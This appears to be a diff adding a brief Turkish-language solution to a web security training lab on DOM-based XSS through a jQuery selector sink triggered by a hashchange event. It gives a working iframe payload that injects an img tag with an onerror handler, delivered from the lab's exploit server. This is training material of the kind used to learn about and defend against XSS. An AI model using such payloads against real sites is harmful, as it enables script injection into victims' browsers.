@@ -1,0 +1,4 @@
+LAB: DOM XSS in jQuery selector sink using a hashchange event
+
+1 - Exploit servere giderek aşağıdaki payloadı kullanıcıya gönderin.
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
